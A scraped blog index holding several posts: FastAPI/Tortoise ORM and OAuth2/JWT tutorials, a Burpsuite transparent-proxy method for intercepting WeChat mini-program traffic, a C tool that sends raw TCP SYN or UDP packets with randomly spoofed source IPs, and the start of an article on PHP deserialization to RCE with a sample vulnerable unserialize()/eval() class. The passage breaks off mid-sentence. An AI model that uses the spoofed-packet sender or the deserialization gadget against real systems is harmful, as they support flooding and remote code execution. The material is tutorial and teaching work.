框架进行测试时存在的问题。\u003c/p\u003e","title":"胸有成竹：Quasar Testing 指南"},{"content":"","date":"2021-01-27","permalink":"/tags/fastapi/","section":"Tags","summary":"","title":"FastAPI"},{"content":"参考了 这个 repo 和 官方文档，踩了一些坑后觉得有必要记录下来。\n目录结构 # app/ |--app.db |--requirements.txt |--initialize.py |--main.py |--Database/ | |--models.py |--Projects/ | |--crud.py | |--projects.py | |--schemas.py 无关目录未列出。\n初始化 # 首先在 main.py 中对初始化流程进行了封装：\nfrom fastapi import FastAPI from Config.openapi import title, desc, version, docs_url from initializer import init app = FastAPI( title=title, description=desc, version=version, docs_url=docs_url ) init(app) 在 init() 中会执行许多初始化操作：\ndef init(app: FastAPI): init_middleware(app) init_db(app) init_routers(app) # ... 注意这里 init_routers() 在 init_db() 后面执行，之后会提到这样做的好处。而 init_db() 函数比较简单：\nfrom fastapi import FastAPI from tortoise import Tortoise from tortoise.contrib.fastapi import register_tortoise from Config import tortoise def init_db(app: FastAPI): register_tortoise( app, db_url=tortoise.db_url, generate_schemas=tortoise.gen_schemas, modules=tortoise.modules ) Tortoise.init_models([\u0026#39;Database.models\u0026#39;],\u0026#39;models\u0026#39;) Tortoise ORM 提供了 register-tortoise 函数，方便我们在服务器启动和关闭时，对 ORM 服务进行启动、关闭。这里传入的配置如下：\ndb_url = \u0026#34;sqlite://app.db\u0026#34; gen_schemas = True modules = {\u0026#34;models\u0026#34;: [\u0026#34;Database.models\u0026#34;]} 测试环境下采用 sqlite3 作为数据库，并声明自动生成数据库 schemas。在 modules 中，指定 app_name 为 models，告诉 Tortoise 到 Database.models 文件中寻找需要的数据库模型。\n最后，需要注意主动调用 init_models 方法进行 Early-init，这是为了保证 Database.models 中的模型都能被及时初始化。否则，生成的 Pydantic Models 极有可能会丢失 Relations 相关的字段。\n关于这一点，文档中给出了 更详尽的描述。\n遗憾的是，文档中 FastAPI Examples 部分并没有体现该问题，因为给出的例子没有用到 Relations 相关 API，不受影响。\n定义数据库模型 # Tortoise ORM 能够很好的支持 Pydantic，甚至可以直接通过定义的数据库模型生成 Pydantic Models，并提供额外的模型转换方法。\n这里我们以比较简单的 Project 对象为例，在 Database/models.py 中创建模型：\nfrom tortoise.fields import IntField, CharField, DatetimeField, ForeignKeyField from tortoise.models import Model class Projects(Model): id = IntField(pk=True) name = CharField(255) 由于对于每个 Project 都可能发起多次 Scan ，定义 Scan 模型时可以使用一个外键约束：\nclass Scans(Model): id = IntField(pk=True) type = CharField(30) target = CharField(255) status = CharField(10) created_at = DatetimeField(auto_now_add=True) project = ForeignKeyField(\u0026#39;models.Projects\u0026#39;, related_name=\u0026#39;scans\u0026#39;) 外键约束的格式是 {app_name}.{model_name}，参数 related_name 代表在 Project 中查询对应的 Scan 时所使用的名字。这样在查询中就可以用 Scans.project 和 Projects.scans 进行正反向引用了。\n实际上，这里的 project 字段在数据库中被替代为 project_id，查询 Scans 时会根据得到的 project_id 继续在 Projects 表中查询结果，毫无疑问这会带来额外的开销，但同时也提高了开发效率。\n定义 Pydantic Models # 接下来在 Projects/schemas.py 中创建 Pydantic Models，Scans 同理：\nfrom Database.models import Projects from tortoise.contrib.pydantic import pydantic_model_creator Project = pydantic_model_creator(Projects, name=\u0026#39;Project\u0026#39;) ProjectIn = pydantic_model_creator( Projects, name=\u0026#39;ProjectIn\u0026#39;, exclude_readonly=True) 为什么要在 Projects.schemas 下才创建 Pydantic Models？因为上文提到，我们必须确保在 Tortoise.init_models() 执行后，才执行 pydantic_model_creator()。由于 Projects/ 目录下的内容会在 init_router() 中执行，因此将 init_router() 放在 init_db() 后就能够确保这一点。\n这样以后，大概可以得到 Project 的结构如下：\n{ id: int, name: str, scans: List[Scan] } 而 Scan 的结构如下：\n{ id: int, type: str, target: str, status: str, created_at: Datetime, project: Project } 容易发现这里出现了一个递归引用的问题，好在 Tortoise ORM 会自动帮我们解决这类问题。真正的问题在于：虽然对 Scan 进行 CRUD 时，常常会需要其对应的 Project，但对 Project 进行 CRUD 时，通常不需要了解它对应着哪些 Scan，而是关心其本身的属性。\n因此我们重新定义 Database.models.Projects，让它不再返回 scans 字段:\nclass Projects(Model): id = IntField(pk=True) name = CharField(255) class PydanticMeta: exclude = [\u0026#39;scans\u0026#39;] 这里的 PydanticMeta 类对于配置自动生成的 Pydantic Models 非常有用，然而目前文档尚不完善，因此记录一下可选的配置：\nclass PydanticMeta: \u0026#34;\u0026#34;\u0026#34; The ``PydanticMeta`` class is used to configure metadata for generating the pydantic Model. Usage: .. code-block:: python3 class Foo(Model): ... class PydanticMeta: exclude = (\u0026#34;foo\u0026#34;, \u0026#34;baa\u0026#34;) computed = (\u0026#34;count_peanuts\u0026#34;,) \u0026#34;\u0026#34;\u0026#34; #: If not empty, only fields this property contains will be in the pydantic model include: Tuple[str, ...] = () #: Fields listed in this property will be excluded from pydantic model exclude: Tuple[str, ...] = () #: Computed fields can be listed here to use in pydantic model computed: Tuple[str, ...] = () #: Use backward relations without annotations - not recommended, it can be huge data #: without control backward_relations: bool = True #: Maximum recursion level allowed max_recursion: int = 3 #: Allow cycles in recursion - This can result in HUGE data - Be careful! #: Please use this with ``exclude``/``include`` and sane ``max_recursion`` allow_cycles: bool = False #: If we should exclude raw fields (the ones have _id suffixes) of relations exclude_raw_fields: bool = True #: Sort fields alphabetically. #: If not set (or ``False``) then leave fields in declaration order sort_alphabetically: bool = False 编写简单 CRUD # 正确进行配置后，可以尝试写 CRUD 来进行测试了：\nfrom Database.models import Projects from .schemas import Project, ProjectIn async def get_all(): return await Project.from_queryset(Projects.all()) async def get(id: int): return await Project.from_queryset_single(Projects.get(id=id)) async def create(param: ProjectIn): target = await Projects.create(**param.dict()) return await Project.from_tortoise_orm(target) async def edit(id: int, param: ProjectIn): await Projects.get(id=id).update(**param.dict()) return async def delete(id: int): await Projects.get(id=id).delete() return Tortoise ORM 生成的 Pydantic Models 可以使用类似 from_queryset() 之类的方法来转换数据库查询得到的结果，十分方便。\n","date":"2021-01-27","permalink":"/posts/fastapi-tortoise/","section":"Posts","summary":"\u003cp\u003e参考了 \u003ca href=\"https://github.com/prostomarkeloff/fastapi-tortoise\"   target=\"_blank\"\u003e这个 repo\u003c/a\u003e 和 \u003ca href=\"https://tortoise-orm.readthedocs.io/en/latest/\"   target=\"_blank\"\u003e官方文档\u003c/a\u003e，踩了一些坑后觉得有必要记录下来。\u003c/p\u003e","title":"各司其职：FastAPI + TortoiseORM 实现异步 DB 操作"},{"content":"","date":"2021-01-27","permalink":"/tags/%E9%A1%B9%E7%9B%AE/","section":"Tags","summary":"","title":"项目"},{"content":"","date":"2021-01-10","permalink":"/tags/jwt/","section":"Tags","summary":"","title":"JWT"},{"content":"写 Pianoforte 时第一个遇到的可复用模块。\n最近在通过项目学习 FastAPI，发现登录认证模块可以复用，于是记录一下。代码主要修改自 官方文档。\n目录结构 # . |--app.db |--requirements.txt |--app/ | |--__init__.py | |--config.py | |--db.py | |--main.py | |--models.py | |--projects/ | |--users/ | | |--__init__.py | | |--auth.py | | |--config.py | | |--crud.py | | |--schemas.py | | |--users.py 最外层是 sqlite 数据库文件和依赖，projects/ 目录和主题无关因此未列出。\n现有代码 # main.py # from fastapi import Depends, FastAPI, HTTPException from fastapi.middleware.cors import CORSMiddleware from .db import engine from . import models, config from .users import users, auth from .projects import projects models.Base.metadata.create_all(bind=engine) app = FastAPI( title=\u0026#39;Pianoforte\u0026#39;, description=\u0026#39;Pianoforte Is AN Offensive Framework Of Red TEam\u0026#39;, version=\u0026#39;0.1.0\u0026#39; ) app.add_middleware( CORSMiddleware, allow_origins=config.allow_origins, allow_credentials=True, allow_methods=config.allow_methods, allow_headers=[\u0026#39;*\u0026#39;] ) app.include_router(users.router, prefix=\u0026#39;/users\u0026#39;, tags=[\u0026#39;users\u0026#39;]) auth_needed = [Depends(auth.get_current_user)] app.include_router(projects.router, prefix=\u0026#39;/projects\u0026#39;, tags=[\u0026#39;projects\u0026#39;], dependencies=auth_needed) 首先根据 models.py 中的定义创建了数据库，数据库相关代码在 db.py 中。随后添加 CORS 中间件，并添加 users 路由和 projects 路由，后者需要认证后方能访问。我们通过 Dependency 的方式，要求 auth.get_current_user 函数运行正常才能访问 projects 路由，由此实现权限管理。\ndb.py # from sqlalchemy import create_engine from sqlalchemy.ext.declarative import declarative_base from sqlalchemy.orm import sessionmaker SQLALCHEMY_DATABASE_URL = \u0026#34;sqlite:///./app.db\u0026#34; # SQLALCHEMY_DATABASE_URL = \u0026#34;postgresql://user:password@postgresserver/db\u0026#34; engine = create_engine( SQLALCHEMY_DATABASE_URL, connect_args={\u0026#34;check_same_thread\u0026#34;: False} ) SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine) Base = declarative_base() def get_db(): db = SessionLocal() try: yield db finally: db.close() 由于项目规模不大，选用 sqlite3 数据库配合 sqlalchemy 的 ORM 功能进行数据库操作。\n此处 yield 方式返回数据库 Session 需要 Python 3.7 及以上。\nmodels.py # from sqlalchemy import Column, Integer, String from .db import Base class User(Base): __tablename__ = \u0026#39;users\u0026#39; id = Column(Integer, primary_key=True, index=True) username = Column(String, unique=True) password = Column(String) 这里仅展示了相关代码，即 User 类的字段。这一段代码在数据库中创建了 users 表来存放用户数据。\n由于业务需要，限定 username 不能重复。\nusers/schemas.py # 上面的 models.py 定义了数据库中的 User 类，而在本文件中定义了两种语义下的 User 类：\nfrom pydantic import BaseModel class UserBase(BaseModel): username: str class UserCreate(UserBase): password: str class User(UserBase): id: int class Config: orm_mode = True 其一是在注册与登录时使用的 UserCreate 类，此时不需要传输 id；其二是在获取用户信息时返回的 User 类，此时不需要传输 password 但需要 id。\nusers/crud.py # from sqlalchemy.orm import Session from ..models import User from . import schemas def get(db: Session, username: str): return db.query(User).filter_by(username=username).first() def create(db: Session, param: schemas.UserCreate): target = User(**param.dict()) db.add(target) db.commit() db.refresh(target) return target 关于数据库操作，这里只涉及到增和查操作。由于 username 唯一，可以使用 username 作为关键字查询。\n在插入数据前，需要将用户传入的数据解构并构建 User 数据库对象。\n认证功能实现 # 我们计划用 OAuth2 的用户名密码认证，并将用户密码哈希后存入数据库。为了维护登陆状态，这里采用 jwt 代替较为繁琐的 cookie 机制。\n注册 # 注册部分较为简单（验证码等部分与主题无关，未展示），在 users.py 中编写路由函数：\nfrom fastapi import APIRouter, Depends, HTTPException from sqlalchemy.orm import Session from sqlalchemy.exc import IntegrityError from . import crud from .auth import get_current_user, auth_user, gen_token, hash_password from .schemas import User, UserCreate from ..db import get_db router = APIRouter() # ... @router.post(\u0026#39;/\u0026#39;) def create(param: UserCreate, db: Session = Depends(get_db)): param.password = hash_password(param.password) try: target = crud.create(db=db, param=param) except IntegrityError: raise HTTPException(status_code=400, detail=\u0026#39;Duplicate username\u0026#39;) return 0 利用 Depends(get_db) 获取一个数据库 Session，然后借助 crud.create 插入密码被哈希后的用户数据。这里的 hash_password 来源于 auth.py：\nfrom passlib.context import CryptContext pwd_context = CryptContext(schemes=[\u0026#39;bcrypt\u0026#39;], deprecated=\u0026#39;auto\u0026#39;) def hash_password(password): return pwd_context.hash(password) 我们采用了 bcrypt 算法进行哈希。同理，验证函数同样简单：\ndef verify_password(plain, hashed): return pwd_context.verify(plain, hashed) 登录：验证用户信息 # 对于给定的 username 和 password，我们需要通过数据库查询验证用户名和密码是否合法：\nfrom sqlalchemy.orm import Session from . import crud def auth_user(db: Session, username: str, password: str): user = crud.get(db=db, username=username) if user is None: return False if not verify_password(password, user.password): return False return user 根据 OAuth2 标准，接收用户名和密码时需要使用 application/x-www-form-urlencoded 格式，当用户名或密码错误时返回 401，且返回自定义 HTTP 头 WWW-Authenticate: Bearer，其中 Bearer 是我们这里使用的携带 token 的方式：\nfrom typing import Dict from fastapi.security import OAuth2PasswordRequestForm @router.post(\u0026#39;/login\u0026#39;, response_model=Dict[str, str]) def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail=\u0026#39;Incorrect username or password\u0026#39;, headers={\u0026#39;WWW-Authenticate\u0026#39;: \u0026#39;Bearer\u0026#39;}) # ... 登录：生成 jwt # 对于给定的数据以及 token 失效时间，借助 python-jose 库，参考 jwt 标准生成 jwt：\nfrom jose import JWTError, jwt from datetime import datetime, timedelta from .config import SECRET_KEY, ALGORITHM def gen_token(data: dict, expires_delta: timedelta = None): to_encode = data.copy() if expires_delta: expire = datetime.utcnow() + expires_delta else: expire = datetime.utcnow() + timedelta(minutes=15) to_encode.update({\u0026#39;exp\u0026#39;: expire}) encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM) return encoded_jwt 这里的 data，根据 jwt 标准可以设置 sub 字段为用户的 username，失效时间也可以在程序中自定义：\nfrom .config import ACCESS_TOKEN_EXPIRE_MINUTES @router.post(\u0026#39;/login\u0026#39;, response_model=Dict[str, str]) def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail=\u0026#39;Incorrect username or password\u0026#39;, headers={\u0026#39;WWW-Authenticate\u0026#39;: \u0026#39;Bearer\u0026#39;}) access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES) access_token = gen_token( data={\u0026#39;sub\u0026#39;: user.username}, expires_delta=access_token_expires) return { \u0026#39;access_token\u0026#39;: access_token, \u0026#39;token_type\u0026#39;: \u0026#39;bearer\u0026#39; } 最后根据 OAuth2 标准返回 {access_token, token_type} 对象。\n根据 jwt 获取用户信息 # 先通过 jwt.decode 解码信息并验证签名，随后对得到的信息进行解析，最后回到数据库中验证解析后的信息：\nfrom fastapi import Depends, HTTPException from fastapi.security import OAuth2PasswordBearer from ..db import get_db oauth2_scheme = OAuth2PasswordBearer(tokenUrl=\u0026#39;users/login\u0026#39;) def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)): credentials_exception = HTTPException( status_code=401, detail=\u0026#39;Could not validate credentials\u0026#39;, headers={\u0026#39;WWW-Authenticate\u0026#39;: \u0026#39;Bearer\u0026#39;}) try: payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]) username: str = payload.get(\u0026#39;sub\u0026#39;) if username is None: raise credentials_exception except JWTError: raise credentials_exception user = crud.get(db=db, username=username) if user is None: raise credentials_exception return user 这里 OAuth2PasswordBearer(tokenUrl='users/login') 实际上和 login 函数的参数 form_data: OAuth2PasswordRequestForm 对应，形成完整的 OAuth2 password flow。\n然后在 users.py 中暴露获取当前登陆用户信息的接口：\n@router.get(\u0026#39;/\u0026#39;, response_model=User) async def get(current_user: User = Depends(get_current_user)): return current_user 测试 # 在 app/ 所在目录运行：\npython3 -m uvicorn app.main:app --reload 随后访问 http://localhost:8000/docs 即可看到 swagger 文档。\n","date":"2021-01-10","permalink":"/posts/fastapi-auth/","section":"Posts","summary":"\u003cp\u003e写 Pianoforte 时第一个遇到的可复用模块。\u003c/p\u003e","title":"久仰大名：基于 FastAPI 实现 OAuth2 登录认证"},{"content":"","date":"2020-12-01","permalink":"/tags/dns/","section":"Tags","summary":"","title":"DNS"},{"content":"","date":"2020-12-01","permalink":"/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/","section":"Categories","summary":"","title":"安全工具"},{"content":"以 Burpsuite 为例。\n背景 # 之前针对某打卡系统写了每天自动打卡的脚本，今天一觉醒来发现后端更新导致脚本失效了，改脚本的同时把之前搜到的抓微信小程序包的方法记录下来备用。\n步骤 # 获取小程序后端域名 # 进入小程序后点右上角 ··· -\u0026gt; 点击小程序名 -\u0026gt; 继续右上角 ··· -\u0026gt; 更多资料 即可看到域名。假设为 example.com。\n解析后端真实 IP # 直接 ping 就行，别的办法如 DNS 查询也行。假设得到 IP 为 a.b.c.d。\n修改 Burpsuite 配置 # Proxy -\u0026gt; Options -\u0026gt; Proxy Listeners 将代理服务器设置为监听所有网卡（All Interfaces），端口 443，并开启透明代理（Support invisible proxying）。 Project Options -\u0026gt; Connections -\u0026gt; Hostname Resolution 中手动设置域名解析，将 example.com 解析到 a.b.c.d。 修改本机 Hosts 文件 # 编辑 C:\\Windows\\System32\\drivers\\etc\\hosts （Linux 下为 /etc/hosts），添加一行：\n127.0.0.1 example.com 最后在电脑上打开微信小程序并用 Burpsuite 抓包。\n原理 # ","date":"2020-12-01","permalink":"/posts/mini-capture/","section":"Posts","summary":"\u003cp\u003e以 Burpsuite 为例。\u003c/p\u003e","title":"透明代理：抓取微信小程序数据包"},{"content":"实习的时候写的一小段代码。\n要求是用 C/C++ 写发送 RAW 数据包的工具，需要支持 TCP 和 UDP。查了下资料发现比想象的要复杂，并且只发现了发送 ICMP RAW 数据包的样例，照着改了改。\n大致需求 # 数据包以 RAW 方式发送 支持 TCP 和 UDP 协议 发送地址由使用者指定 源地址随机 发送消息内容随机 一些固定的部分 # 头文件 raw.h 中存在一个固定的结构体和固定的函数：\nextern int errno; #pragma pack(1) typedef struct PACKET_RAW_HEADER { uint32_t dwIP; uint16_t uPort; PACKET_RAW_HEADER() : dwIP(0), uPort(0) {} } PacketRawHeader, * pPacketRawHeader; #pragma pack() int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP); 之后的修改都必须基于这二者进行。\n因此可以根据这些固定的部分先把主函数写好：\n#include \u0026#34;raw.h\u0026#34; int main(int argc, char *argv[]) { if (argc != 4) { printf(\u0026#34;Usage: %s [ip] [port] [tcp|udp]\\n\u0026#34;, argv[0]); exit(-1); } PacketRawHeader *pPacketRawHeader = new PacketRawHeader(); pPacketRawHeader-\u0026gt;dwIP = inet_addr(argv[1]); pPacketRawHeader-\u0026gt;uPort = htons(atoi(argv[2])); bool bTCP = true; if (!strcmp(argv[3], \u0026#34;udp\u0026#34;)) { bTCP = false; } printf(\u0026#34;%s\\n\u0026#34;, strerror(sendrawpacket(pPacketRawHeader, bTCP))); return 0; } 随后在主要需要修改的 sendrawpacket 函数中处理中断，关闭 socket：\nint sockfd; int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { signal (SIGINT, interrupt_handler); signal (SIGTERM, interrupt_handler); } void interrupt_handler (int signum) { close(sockfd); free(clientaddr); exit(0); } 主要逻辑 # 创建 socket # int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) \u0026lt;0) { fprintf(stderr,\u0026#34;Error creating socket:%s\\n\u0026#34;, strerror(errno)); return errno; } //... } 根据要求，需要采用 SOCK_RAW + IPPROTO_RAW 的方式创建 socket。此时必须自己填充 IP 头部 以及 TCP/UDP 头部。\n设置地址 # 设置目标地址，该地址由命令行参数指定：\nstruct sockaddr_in* clientaddr = NULL; int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... clientaddr = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in)); if (clientaddr == NULL) { fprintf(stderr,\u0026#34;Error allocating memory:%s\\n\u0026#34;, strerror(errno)); goto end; } clientaddr-\u0026gt;sin_family = AF_INET; clientaddr-\u0026gt;sin_port = pRawHeader-\u0026gt;uPort; clientaddr-\u0026gt;sin_addr.s_addr = pRawHeader-\u0026gt;dwIP; //... end: close(sockfd); return errno; } 而源地址则由程序随机生成：\nint sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { char buffer[BUF_LEN] = {0}; char src_ip[20] = {0}; uint16_t src_port; char *string_data = NULL; size_t hdr_size = (bTCP ? (THDR_SZ) : (UHDR_SZ)); //... srand(time(NULL)); string_data = (char *) (buffer + IPHDR_SZ + hdr_size); for (int i = 0; i \u0026lt; MSG_LEN; ++i) { string_data[i] = \u0026#39;0\u0026#39; + rand()%72; } string_data[MSG_LEN] = 0; printf(\u0026#34;Message: %s\\n\u0026#34;, string_data); sprintf(src_ip,\u0026#34;%d.%d.%d.%d\u0026#34;, rand()%256, rand()%256, rand()%256, rand()%256); src_port = rand()%65535 + 1; printf(\u0026#34;Source IP: %s\\nSource Port: %d\\n\u0026#34;, src_ip, src_port); //... } 其中定义的宏如下：\n#define BUF_LEN 1024 #define MSG_LEN 50 #define IPHDR_SZ sizeof(struct iphdr) #define THDR_SZ sizeof(struct tcphdr) #define UHDR_SZ sizeof(struct udphdr) 这里用 buffer 存放完整的报文，string_data 存放消息，报文结构实际上是：\n------------------------------------------ | IP Header | TCP/UDP Header | string_data | ------------------------------------------ \\ / ---------------- buffer ----------------- 填充 IP 头部 # int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct iphdr *ip_hdr = (struct iphdr *)buffer; //... ip_hdr-\u0026gt;ihl = 5; ip_hdr-\u0026gt;version = 4; ip_hdr-\u0026gt;tos = 0; ip_hdr-\u0026gt;tot_len = IPHDR_SZ + hdr_size + strlen(string_data); ip_hdr-\u0026gt;ttl = 64; ip_hdr-\u0026gt;protocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); ip_hdr-\u0026gt;saddr = inet_addr(src_ip); ip_hdr-\u0026gt;daddr = clientaddr-\u0026gt;sin_addr.s_addr; ip_hdr-\u0026gt;check = csum((unsigned short *)ip_hdr, ip_hdr-\u0026gt;tot_len); //... } 这里需要对 IP 头部计算校验和，计算方法和之后 TCP / UDP 头部校验和计算方法相同，每 16 bit 进行反码求和：\nunsigned short csum(unsigned short *ptr, int nbytes) { register long sum; unsigned short oddbyte; register short answer; sum = 0; while (nbytes\u0026gt; 1) { sum += *ptr++; nbytes -= 2; } if (nbytes == 1) { oddbyte = 0; *((u_char*)\u0026amp;oddbyte) = *(u_char*)ptr; sum += oddbyte; } sum = (sum\u0026gt;\u0026gt;16) + (sum \u0026amp; 0xffff); sum = sum + (sum\u0026gt;\u0026gt;16); answer = (short)~sum; return (answer); } 填充 TCP / UDP 头部 # int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct tcphdr *tcp_hdr = (struct tcphdr *)(buffer + IPHDR_SZ); struct udphdr *udp_hdr = (struct udphdr *)(buffer + IPHDR_SZ); //... if (bTCP) { tcp_hdr-\u0026gt;source = htons(src_port); tcp_hdr-\u0026gt;dest = clientaddr-\u0026gt;sin_port; tcp_hdr-\u0026gt;doff = 5; tcp_hdr-\u0026gt;window = htons(200); tcp_hdr-\u0026gt;syn = 1; } else { udp_hdr-\u0026gt;source = htons(src_port); udp_hdr-\u0026gt;dest = clientaddr-\u0026gt;sin_port; udp_hdr-\u0026gt;len = htons(8 + strlen(string_data)); } //... } 这里协议头部中使用了一些常用的参数值，使用 TCP 协议时发送 SYN 包。\n填充 TCP / UDP 伪头部 # 先定义伪头部结构体：\nstruct pseudo_iphdr { uint32_t source_ip_addr; uint32_t dest_ip_addr; uint8_t fixed; uint8_t protocol; uint16_t len; }; #define PHDR_SZ sizeof(struct pseudo_iphdr) 随后填充伪头部：\nint sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... struct pseudo_iphdr csum_hdr; //... csum_hdr.source_ip_addr = ip_hdr-\u0026gt;saddr; csum_hdr.dest_ip_addr = clientaddr-\u0026gt;sin_addr.s_addr; csum_hdr.fixed = 0; csum_hdr.protocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); csum_hdr.len = htons(hdr_size + strlen(string_data)); //... } 计算 TCP / UDP 校验和 # 填充好伪头部后，便可以计算校验和了。首先将需要校验的部分放进 csum_buffer 中，也就是伪头部 + 头部 + 数据。随后用 csum 函数计算校验和并填入相应字段：\nint sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { // ... char *csum_buffer = NULL; size_t psize; //... psize = PHDR_SZ + hdr_size + strlen(string_data); csum_buffer = (char *)calloc(psize, sizeof(char)); if (csum_buffer == NULL) { fprintf(stderr,\u0026#34;Error allocating memory:%s\\n\u0026#34;, strerror(errno)); goto end1; } memcpy(csum_buffer, (char *)\u0026amp;csum_hdr, PHDR_SZ); memcpy(csum_buffer + PHDR_SZ, udp_hdr, hdr_size + strlen(string_data)); if (bTCP) { tcp_hdr-\u0026gt;check = csum((unsigned short *) csum_buffer, psize); } else { udp_hdr-\u0026gt;check = csum((unsigned short *) csum_buffer, psize); } free (csum_buffer); csum_buffer = NULL; //... end1: free(clientaddr); clientaddr = NULL; end: close(sockfd); return errno; } 此时报文大概是这样：\n---------------------------------------------------- | ... | Pseudo Header | TCP/UDP Header | string_data | ---------------------------------------------------- \\ / ---- IP Header ---- \\ / ---------------------- buffer --------------------- 发送数据包 # 直接使用 sendto 指定地址为 clientaddr 即可。\nint sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP) { //... if (sendto(sockfd, buffer, ip_hdr-\u0026gt;tot_len, 0, (struct sockaddr *)clientaddr, sizeof(struct sockaddr_in)) \u0026lt;0) { fprintf(stderr,\u0026#34;Error sending message:%s\\n\u0026#34;, strerror(errno)); goto end1; } end1: free(clientaddr); clientaddr = NULL; end: close(sockfd); return errno; } 最后，可以使用 wireshark 进行测试，并打开校验和验证功能。\n","date":"2020-11-16","permalink":"/posts/raw-packet/","section":"Posts","summary":"\u003cp\u003e实习的时候写的一小段代码。\u003c/p\u003e","title":"算无遗策：socket 编程发送 RAW 数据包"},{"content":"专业英语的一次分享。Slides。\nAbstract # A brief and easy-to-understand introduction of deserialization vulnerability is presented in this article. Demonstrating with examples in PHP and Java programming language, the article shows how to achieve RCE by exploiting such vulnerabilities and several ways of defending, including language-specific methods and DXP.\nIntroduction # An attacker can trigger RCE attacks through a dangerous, yet commonly-used technique called deserialization. Here we introduce some basic concepts about deserialization vulnerability.\nSerialization and Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.\nSerialization is adapted as a cross-platform, language-independent technique to address the problem of data persistence as well as data transmission. In RFC 10141, a standard was introduced where objects are serialized to bytes and vice versa.\nOn the other hand, deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.\nHowever, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process.\nUnfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, and RCE attacks2.\nRCE Attack # RCE, namely Remote Code Execution, is one of the most common types of attacks towards web applications. By triggering RCE, an attacker is able to execute PHP, Python, Java or even OS-level code directly from the Internet. Therefore, the attacker basically controls the server behind the web application, which is surely critical.\nExamples of Serialized Data # Here we present two examples of serialized data in PHP and Java.\nPHP # For example, here is a PHP class A containing an integer and an array of strings. And b is an instance of class A.\n\u0026lt;?php class A { public $one = 1; public $two = array(\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;); } $b = new A(); echo serialize($b); ?\u0026gt; Now if we serialize b, we got the serialized data below:\nO:1:\u0026#34;A\u0026#34;:2:{s:3:\u0026#34;one\u0026#34;;i:1;s:3:\u0026#34;two\u0026#34;;a:3:{i:0;s:5:\u0026#34;apple\u0026#34;;i:1;s:4:\u0026#34;pear\u0026#34;;i:2;s:6:\u0026#34;banana\u0026#34;;}} Here O indicates an object, with a class name A whose length is one. It has two members, where the first one is called one which is an integer with value 1. The second one is called two which is an array with 3 elements: apple, pear, banana with index 0,1 and 2.\nReaders may find this rule of serialization easy to remember, because it uses only ASCII characters to construct serialized data.\nJava # In Java, things are not as simple as in PHP.\nimport java.io.Serializable; class TestSerial implements Serializable { public byte version = 100; public byte count = 0; } For an object containing only two bytes version and count above, it takes 52 bytes to store its serialized data, which seems to be random3:\nAC ED 00 05 73 72 00 0A 53 65 72 69 61 6C 54 65 73 74 A0 0C 34 00 FE B1 DD F9 02 00 02 42 00 05 63 6F 75 6E 74 42 00 07 76 65 72 73 69 6F 6E 78 70 00 64 Since we have seen what serialized data looks like, and we already know that deserialization turns these data into language-specific objects, we are going to demonstrate why deserialization is dangerous, starting from PHP.\nPHP Deserialization # PHP uses a function called unserialize() to perform deserialization4. The key to carry out our attack is to control the argument of this function, so that we can create arbitrary objects that enable us to do nearly anything.\nA Simple Scenario # \u0026lt;?php class merc { var $test = \u0026#39;123\u0026#39;; } $object = new merc(); $data = serialize($object); $new_object = unserialize($data); For instance, if we pass in the string below to our $data, we can create a merc object whose value of test is 456, although in the original code there\u0026rsquo;s no way to change the value of test for a merc object.\nO:4:\u0026#34;merc\u0026#34;:1:{s:4:\u0026#34;test\u0026#34;;s:3:\u0026#34;456\u0026#34;;} Such an attack is certainly useless and can never achieve RCE. That is where magic functions come in handy.\nMagic Functions # Every PHP object has these magic functions that will be called automatically under special conditions4.\n__construct(): Called when the object is created using new operator, while using unserialize() won\u0026rsquo;t have the same effect. __destruct(): Called when the object is being destroyed. __toString(): Called whenever the object needs to be converted to a string. __call(): Called when an access to a member function failed. __wakeup(): Called after unserialize() is called. The reason we need those functions is that it is impossible to call any function manually through deserialization vulnerability, so we need something that would be called automatically.\nBesides, though deserialization may allow us to control attributes of an object, we can by no means modify its member functions. That leads us to think about the possibility to call other objects\u0026rsquo; member functions, which can be found inside magic functions sometimes.\nSearching for Evil Functions # \u0026lt;?php class merc { public $test; function __construct() { $this-\u0026gt;test = new L(); } function __destruct() { $this-\u0026gt;test-\u0026gt;goodbye(); } } class L { function goodbye() { echo \u0026#34;Bye~\u0026#34;; } } Here merc contains an attribute test, which is actually an instance of class L. It will call goodbye() function of class L when being destroyed, and everything seems normal.\nHowever, here is another class Evil with a goodbye() function containing one of the most dangerous functions eval().\nclass Evil { var $bye_message; function goodbye() { eval($this-\u0026gt;bye_message); } } unserialize($_GET[\u0026#39;test\u0026#39;]); This function reads a string, treat it as a code snippet, and execute it without any examination. Under no circumstances should it be used in code.\nSince we can pass in our data through the 